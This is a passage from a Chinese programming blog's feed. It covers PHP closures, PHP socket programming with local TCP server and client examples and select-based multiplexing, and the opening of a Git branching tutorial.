<p>如何去调用这个闭包函数呢？很简单，在这个例子里面只要 <strong>$f()</strong> 就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($f()); #结果是：3</span><br></pre></td></tr></table></figure>

<p>当然这个匿名函数也是可以传参的，你可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$f &#x3D; function ($c) &#123;</span><br><span class="line">    $a &#x3D; 1;</span><br><span class="line">    $b &#x3D; 2;</span><br><span class="line">    return $a + $b + $c;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这样你在调用的时候就可以传入参数，类似 <strong>$f(3)</strong>, 但是有一点需要注意，如果这时候你想在定义闭包函数的时候使用外部变量，举个例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$out &#x3D; 100;</span><br><span class="line">$f &#x3D; function ($c) &#123;</span><br><span class="line">    $a &#x3D; 1;</span><br><span class="line">    $b &#x3D; 2;</span><br><span class="line">    return $out - ($a + $b + $c); #报错，无法引用外部变量out</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这时候就体现了闭包封闭的特性，但是PHP提供了一个 use 关键字，可以使用下面这个写法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$out &#x3D; 100;</span><br><span class="line">$f &#x3D; function ($c) use ($out) &#123;</span><br><span class="line">    $a &#x3D; 1;</span><br><span class="line">    $b &#x3D; 2;</span><br><span class="line">    return $out - ($a + $b + $c);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="三-闭包到底有啥用？"><a href="#三-闭包到底有啥用？" class="headerlink" title="三.闭包到底有啥用？"></a>三.闭包到底有啥用？</h3><p>一般来说还是在框架以及一些架构设计里面会用到，这里先举2个小例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$arr &#x3D; [1, 2, 3, 4, 5];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;使用array_reduce求和</span><br><span class="line"></span><br><span class="line">function sum($arr)</span><br><span class="line">&#123;</span><br><span class="line">    return array_reduce($arr, function ($x, $y) &#123;</span><br><span class="line">        return $x + $y;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(sum($arr));</span><br></pre></td></tr></table></figure>
<p>代码里面使用了 array_reduce 这个函数求一个数组的和，但是，如果不需要立刻求和，而是在后面的代码中，根据需要再计算怎么办？可以不返回求和的结果，而是返回求和的函数！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lazySum</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array_reduce($arr, <span class="function"><span class="keyword">function</span> <span class="params">($x, $y)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $x + $y;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">$sum = lazySum($arr);</span><br><span class="line">var_dump($sum());</span><br></pre></td></tr></table></figure>
<p>结果是一样的，虽然这种写法有点奇怪</p>
<hr>
<p>有一道面试题就涉及到了闭包的特性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">plus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $funcArr = [];</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">3</span>; $i++) &#123;</span><br><span class="line">        $funcArr[] = <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">(&amp;$i)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $i * $i;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $funcArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$res = plus();</span><br><span class="line"></span><br><span class="line">var_dump($res[<span class="number">0</span>]());</span><br><span class="line">var_dump($res[<span class="number">1</span>]());</span><br><span class="line">var_dump($res[<span class="number">2</span>]());</span><br></pre></td></tr></table></figure>
<p>plus 函数会返回3个闭包函数，然后依次调用这个几个函数, 有人以为结果可能是1,4,9，其实结果都是16，需要注意的是use 那里使用的是引用传递，这就意味着在生成这3个闭包函数的时候i的值并不是循环的时候的1,2,3，而且到最后 $i++ 之后的值也就是 4，这说明闭包函数是调用的时候才会执行。</p>
<h3 id="四-闭包在PHP框架里面使用"><a href="#四-闭包在PHP框架里面使用" class="headerlink" title="四.闭包在PHP框架里面使用"></a>四.闭包在PHP框架里面使用</h3><p>1.一个是IOC容器</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 闭包的使用IOC</span></span><br><span class="line"><span class="comment"> * Class Container</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> $bindings;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span><span class="params">(string $abstract, Closure $concrete)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::$bindings[$abstract] = $concrete;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">(string $abstract)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func(<span class="keyword">static</span>::$bindings[$abstract]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">talk</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">greet</span><span class="params">($target)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello "</span> . $target-&gt;getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">say</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"World\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$talk = <span class="keyword">new</span> talk();</span><br><span class="line"></span><br><span class="line">Container::bind(<span class="string">'foo'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> say();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$talk-&gt;greet(Container::make(<span class="string">'foo'</span>));</span><br></pre></td></tr></table></figure>
<p>接触过laravel框架的应该都见过这种写法，laravel框架称之为服务容器，其设计思想基本上就是这样，也就是在框架初始化的时候注册绑定一堆服务，然后框架里面随时就可以调用这些服务了。</p>
<p>2.闭包路由</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 演示闭包的使用,路由</span></span><br><span class="line"><span class="comment"> * Class App</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $routes = [];</span><br><span class="line">    <span class="keyword">protected</span> $responseStatus = <span class="string">'200 OK'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $responseContentType = <span class="string">'text/html'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $responseBody = <span class="string">'Hello World'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addRoute</span><span class="params">(string $path, Closure $callback)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;routes[$path] = $callback-&gt;bindTo(<span class="keyword">$this</span>, <span class="keyword">__CLASS__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">(string $path)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;routes <span class="keyword">as</span> $routePath =&gt; $callback) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($routePath === $path) &#123;</span><br><span class="line">                $callback();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">'HTTP/1.1 '</span> . <span class="keyword">$this</span>-&gt;responseStatus);</span><br><span class="line">        header(<span class="string">'Content-Type: '</span> . <span class="keyword">$this</span>-&gt;responseContentType);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span> . mb_strlen(<span class="keyword">$this</span>-&gt;responseBody));</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;responseBody;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &#39;App.php&#39;;</span><br><span class="line"></span><br><span class="line">$app &#x3D; new App();</span><br><span class="line"></span><br><span class="line">$app-&gt;addRoute(&quot;&#x2F;&quot;, function () &#123;</span><br><span class="line">    $this-&gt;responseBody &#x3D; &quot;Hello Closure!\n&quot;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$app-&gt;dispatch(&quot;&#x2F;&quot;);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Closure</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP Socket 网络编程</title>
    <url>/2018/coding/php/php-socket-programing.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做PHP开发的过程中，大部分我们都在和http协议打交道，在ISO模型里面，http属于应用层协议，它底层会用到TCP协议。http协议非常简单，它是一个文本协议，一个请求对应一个响应，客户端发起一个请求，服务端响应这个请求。http是一个一问一答的对话，每次请求都得重新建立对话（这里暂不讨论Keep-Alive），如果你想通过一个请求进行多次对话，那就是长连接通信，必须使用TCP或者UDP协议。</p>
<p>互联网运行的基石是建立在一些协议上的，目前而言主要是TCP/IP协议族，大部分协议都是公开开放的，计算机遵循这些协议我们才能通信，当然也有一些私有协议，私有协议只有自己知道如何去解析，相当来说更安全，比如QQ所用的协议就是自己定义的。在ISO模型里面，咱们常用的有http、ftp、ssh、dns等，但是不常用的数不胜数，发明一个协议不难，难的是如何设计的更好用，而且大家都喜欢用。</p>
<h2 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h2><p>Socket并不是一个协议，本质上说Socket是对 TCP/IP 协议的封装，它是一组接口，在设计模式中，Socket 其实就是一个门面（facade）模式，它把复杂的 TCP/IP 协议族隐藏在 Socket 接口后面，对用户来说，一组简单的接口就是全部，让 Socket 去组织数据，以符合指定的协议。</p>
<a id="more"></a>

<p>下图展示了Socket在ISO模型里面大概位置：</p>
<img src = "/images/old/5f6e3e27ly1g372hly7xkj20f20d8js4.jpg" />

<h2 id="PHP-Socket"><a href="#PHP-Socket" class="headerlink" title="PHP Socket"></a>PHP Socket</h2><p>虽然PHP的强项是处理文本，一般用来写网页和http接口，但是官方依然提供了Socket扩展，编译PHP时在配置中添加–enable-sockets 配置项来启用，如果使用apt或yum安装，默认情况下是已启用。</p>
<p><a href="https://www.php.net/manual/zh/book.sockets.php" target="_blank" rel="noopener">官方文档</a>里面列出了大概40个函数，但是常用的也就那几个，跟着文档，咱们一起来学学如何使用，首先声明一下，本人对Socket编程并不熟悉，如有错误的地方，希望大家指出来。</p>
<p>咱们先看一幅图，关于TCP客户端和服务端之间的通信过程，咱们平时写http接口的时候并未做这么多工作，那是客户端给封装好了：</p>
<img src = "/images/old/5f6e3e27ly1g371bhib22j20da0dn0t2.jpg" />


<h3 id="1-服务端代码"><a href="#1-服务端代码" class="headerlink" title="1.服务端代码"></a>1.服务端代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$port = <span class="number">8888</span>;</span><br><span class="line"></span><br><span class="line">$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line"></span><br><span class="line">socket_bind($sock, $ip, $port);</span><br><span class="line">socket_listen($sock, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Server Started, Listen On $ip:$port\n"</span>;</span><br><span class="line"></span><br><span class="line">$accept = socket_accept($sock);</span><br><span class="line"></span><br><span class="line">socket_write($accept, <span class="string">"Hello World!\n"</span>, <span class="number">8192</span>);</span><br><span class="line"></span><br><span class="line">$buf = socket_read($accept, <span class="number">8192</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Receive Msg： "</span> . $buf . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">socket_close($sock);</span><br></pre></td></tr></table></figure>
<p>简单说一下,为便于演示，所以省略了所有的错误处理代码，可以看到分为create、bind、listen、accept、write\read、close这几步，看上去非常简单！具体参数大家可以看一下文档！在服务端启动之后，当收到一个请求之后，我们首先返回了一个<code>Hello World\n</code>,然后又读取了8192个字节的数据，打印出来！最后关闭连接。</p>
<p>由于这里，咱还没有写客户端，所以暂时使用curl访问一下，运行效果如下：</p>
<p>===&gt;服务端：</p>
<img src = "/images/old/5f6e3e27ly1g373ivwa2ej20ls06274r.jpg" />

<p>===&gt;客户端：</p>
<img src = "/images/old/5f6e3e27ly1g373k4ahoij20hw03cwem.jpg" />

<p>从这个例子里面我们可以看出来，curl发出是一个标准的http请求，实际上它的每一行后面是有\n的，在http协议里面，这几行文本其实是头（header）,但是在这个例子里面，对于我们来说，它就是一段文本而已，服务端只是把它的内容打印出来了,并没有去按照http协议去解析。虽然我们返回了<code>Hello World！\n</code>，但是这也并没有按照http协议的格式去做，缺少响应头。我只能说curl比较强大，如果使用浏览器访问的话会失败，提示<code>127.0.0.1 sent an invalid response</code>。</p>
<p>但是稍加改造，我们就可以返回一个标准的http响应：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$response = <span class="string">"HTTP/1.1 200 OK\r\n"</span>;</span><br><span class="line">$response .= <span class="string">"Server: Socket-Http\r\n"</span>;</span><br><span class="line">$response .= <span class="string">"Content-Type: text/html\r\n"</span>;</span><br><span class="line">$response .= <span class="string">"Content-Length: 13\r\n\r\n"</span>;</span><br><span class="line">$response .= <span class="string">"Hello World!\n"</span>;</span><br><span class="line"></span><br><span class="line">socket_write($accept, $response, <span class="number">8192</span>);</span><br></pre></td></tr></table></figure>
<p>这时候如果再用浏览器访问，就可以看到 Hello World!了，但是这个服务端目前是一次性的，就是说它只能处理一次请求，然后就结束了，正常的服务端是可以处理多次请求的，很简单，加一个死循环就行了！</p>
<p>只贴一下改动的部分，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    $accept = socket_accept($sock);</span><br><span class="line"></span><br><span class="line">    $buf = socket_read($accept, <span class="number">8192</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Receive Msg： "</span> . $buf . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    $response = <span class="string">"HTTP/1.1 200 OK\r\n"</span>;</span><br><span class="line">    $response .= <span class="string">"Server: Socket-Http\r\n"</span>;</span><br><span class="line">    $response .= <span class="string">"Content-Type: text/html\r\n"</span>;</span><br><span class="line">    $response .= <span class="string">"Content-Length: 13\r\n\r\n"</span>;</span><br><span class="line">    $response .= <span class="string">"Hello World!\n"</span>;</span><br><span class="line"></span><br><span class="line">    socket_write($accept, $response, <span class="number">8192</span>);</span><br><span class="line"></span><br><span class="line">    socket_close($accept);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>摇身一变，就是一个http服务了，使用ab测了一下，并发上万，是不是有点小激动？</p>
<img src = "/images/old/5f6e3e27ly1g37ldkacn8j20l909twfu.jpg" />


<p>然而，之所以这么快是因为逻辑简单，假如你在while里面任何位置加一个 sleep(1) 你就会发现，原来这特么是串行的，一个个执行的，并不是并行，这段脚本一次只能处理一个请求！</p>
<p>解决这个问题方法有很多种，具体可以参考 <a href="https://rango.swoole.com/archives/508" target="_blank" rel="noopener">PHP并发IO编程之路</a>, 看看前半段就行了，后半段是广告！该文章总结了3种方法：最早是采用多进程多线程方式，由于进程线程开销大，这种方式效率最低。后来演进出master-worker模型，也就是类似现在fpm采用的方式。目前最先进的方式就是异步io多路复用，基于epoll实现的。<strong>理论上讲C能实现的，PHP都能通过扩展去实现</strong>，而且PHP确实提供了相关扩展，其思想和C写的都差不多，然而今天咱不是说高并发编程的，还是接着说Socket吧！</p>
<h3 id="2-客户端代码"><a href="#2-客户端代码" class="headerlink" title="2.客户端代码"></a>2.客户端代码</h3><p>之前的例子里面我们使用的是curl访问的，也可以使用浏览器或者telnet，这些工具都可以算作是客户端，客户端也可以自己实现。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$port = <span class="number">8888</span>;</span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"></span><br><span class="line">$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Connecting $ip:$port\n"</span>;</span><br><span class="line"></span><br><span class="line">socket_connect($sock, $ip, $port);</span><br><span class="line"></span><br><span class="line">$input = <span class="string">"Hello World Socket"</span>;</span><br><span class="line"></span><br><span class="line">socket_write($sock, $input, strlen($input));</span><br><span class="line"></span><br><span class="line">$out = socket_read($sock, <span class="number">8192</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Receive Msg: $out\n"</span>;</span><br><span class="line"></span><br><span class="line">socket_close($sock);</span><br></pre></td></tr></table></figure>
<p>这段代码同样省略了错误处理代码，可以看到第一步都是create，但是第二步变成connect，然后是read\write、最后close。</p>
<p>具体运行效果这里不再展示，和curl访问没多大区别，但是这个客户端也是一次性的，执行完了就结束！</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>接下来，我们来写一个基于TCP通信的应用，这个应用非常简单，就是加减乘除！</p>
<p>(1)服务端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$port = <span class="number">8888</span>;</span><br><span class="line"></span><br><span class="line">$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line"></span><br><span class="line">socket_bind($sock, $ip, $port);</span><br><span class="line"></span><br><span class="line">socket_listen($sock, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Server Started, Listen On $ip:$port\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    $accept = socket_accept($sock);</span><br><span class="line"></span><br><span class="line">    $buf = socket_read($accept, <span class="number">8192</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Receive Msg： "</span> . $buf . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    $params = json_decode($buf, <span class="keyword">true</span>);</span><br><span class="line">    $m = $params[<span class="string">'m'</span>];</span><br><span class="line">    $a = $params[<span class="string">'a'</span>];</span><br><span class="line">    $b = $params[<span class="string">'b'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> ($m) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'+'</span>;</span><br><span class="line">            $response = $a + $b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'-'</span>;</span><br><span class="line">            $response = $a - $b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'*'</span>;</span><br><span class="line">            $response = $a * $b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'/'</span>;</span><br><span class="line">            $response = $a / $b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $response = $a + $b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socket_write($accept, $response.<span class="string">"\n"</span>, <span class="number">8192</span>);</span><br><span class="line"></span><br><span class="line">    socket_close($accept);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(2)客户端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$port = <span class="number">8888</span>;</span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"></span><br><span class="line">$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Connecting $ip:$port\n"</span>;</span><br><span class="line"></span><br><span class="line">socket_connect($sock, $ip, $port);</span><br><span class="line"></span><br><span class="line">$input = json_encode([</span><br><span class="line">    <span class="string">'a'</span> =&gt; <span class="number">15</span>,</span><br><span class="line">    <span class="string">'b'</span> =&gt; <span class="number">10</span>,</span><br><span class="line">    <span class="string">'m'</span> =&gt; <span class="string">'+'</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">socket_write($sock, $input, strlen($input));</span><br><span class="line"></span><br><span class="line">$out = socket_read($sock, <span class="number">8192</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Receive Msg: $out\n"</span>;</span><br><span class="line"></span><br><span class="line">socket_close($sock);</span><br></pre></td></tr></table></figure>
<p>在这些代码里面，我按照自己的需求定义了一个“协议”，我把需要运算的数和方式通过一个json数组传输，约定了一个格式，这个协议只有我自己清楚，所以只有我才知道怎么调用。服务端在接受到参数之后，通过运算得出结果，然后把结果返回给客户端。</p>
<p>但是这个例子还有问题，客户端依然是一次性的，参数都被硬编码在代码里面，不够灵活，最关键是没有用到TCP长连接的特性，我们每次计算都得重新发起请求、重新建立连接，实际上，我需要的是一次连接，多次对话，也就是进行多次计算！</p>
<p>目前为止，这些演示代码都没有复用连接，因为在服务端最后我close了这个连接，这意味着每次都是一个新的请求，如果是http服务的话尚且可以用一下，如何去实现一个TCP长连接呢？</p>
<h2 id="IO多路复用之select"><a href="#IO多路复用之select" class="headerlink" title="IO多路复用之select"></a>IO多路复用之select</h2><p>select系统调用的目的是在一段指定时间内，监听用户感兴趣的文件描述符上的可读、可写和异常事件，虽然这个方式也比较低效，但是不妨了解一下，通过这种方式我们可以复用连接，完整的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$port = <span class="number">8888</span>;</span><br><span class="line"></span><br><span class="line">$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line"></span><br><span class="line">socket_bind($sock, $ip, $port);</span><br><span class="line"></span><br><span class="line">socket_listen($sock, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Server Started, Listen On $ip:$port\n"</span>;</span><br><span class="line"></span><br><span class="line">socket_set_nonblock($sock);</span><br><span class="line"></span><br><span class="line">$clients = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    $rs = array_merge([$sock], $clients);</span><br><span class="line">    $ws = [];</span><br><span class="line">    $es = [];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//监听文件描述符变动</span></span><br><span class="line">    $ready = socket_select($rs, $ws, $es, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$ready) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array($sock, $rs)) &#123;</span><br><span class="line">        $clients[] = socket_accept($sock);</span><br><span class="line">        $key = array_search($sock, $rs);</span><br><span class="line">        <span class="keyword">unset</span>($rs[$key]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($rs <span class="keyword">as</span> $client) &#123;</span><br><span class="line">        $input = socket_read($client, <span class="number">8096</span>);</span><br><span class="line">        <span class="keyword">if</span> ($input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            $key = array_search($client, $clients);</span><br><span class="line">            <span class="keyword">unset</span>($clients[$key]);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"input: "</span> . $input;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解析参数，计算结果</span></span><br><span class="line">        preg_match(<span class="string">"/(\d+)(\W)(\d+)/"</span>, $input, $params);</span><br><span class="line">        <span class="keyword">if</span> (count($params) === <span class="number">4</span>) &#123;</span><br><span class="line">            $a = intval($params[<span class="number">1</span>]);</span><br><span class="line">            $b = intval($params[<span class="number">3</span>]);</span><br><span class="line">            $m = $params[<span class="number">2</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> ($m) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'+'</span>;</span><br><span class="line">                $result = $a + $b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'-'</span>;</span><br><span class="line">                $result = $a - $b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'*'</span>;</span><br><span class="line">                $result = $a * $b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'/'</span>;</span><br><span class="line">                $result = $a / $b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $result = $a + $b;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $output = <span class="string">"output: $result\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $output;</span><br><span class="line">        socket_write($client, $output, strlen($output));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我使用了telnet连接服务端进行操作，运行效果如下，一个基于TCP长连接的网络版简易计算器：</p>
<img src = "/images/old/5f6e3e27ly1g385x7u95fj20p50f1wfh.jpg" />

<p>在这个例子，传参的“协议”稍微有点变化，只是为了更方便在telnet里面交互，但是很容易理解。这里面最关键是定义了一个全局变量用来存储连接资源描述符，然后通过select去监听变化,最后遍历整个数组，读取\写入数据！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上面的简单介绍，希望大家都对PHP Socket编程有一些了解和认识，其实作为Web开发来说，很少会用到裸TCP去连接，大部分时候都是使用基于TCP的http协议，只有涉及到一些对响应速度要求非常高的应用，比如说游戏、实时通信、物联网才会用到，如果真的用到，不妨尝试一下Workman、Swoole这些成熟的框架！</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Socket</tag>
      </tags>
  </entry>
  <entry>
    <title>Git最简单的分支操作教程</title>
    <url>/2018/linux/git-branch-usage.html</url>
    <content><![CDATA[<p>之前那篇文章，只是简单讲了一下git最基础最简单的用法，但是git还有一个非常重要的功能就是分支，默认情况下只有一个master分支，我们可以直接在master分支开发，完全没问题，<br>但是当你的项目有十几个甚至几十个人同时在开发的时候，如果都使用master分支，就会非常容易出现冲突、甚至出现代码被覆盖的问题，而且上线也是个问题，你不知道哪些文件可以上，哪些不可以上，很容易把一些未经测试的代码上线，这时候就需要启用分支功能。<br><img src = "/images/old/5f6e3e27ly1fyowuwste0j20nw0bvt93.jpg" /></p>
<a id="more"></a>

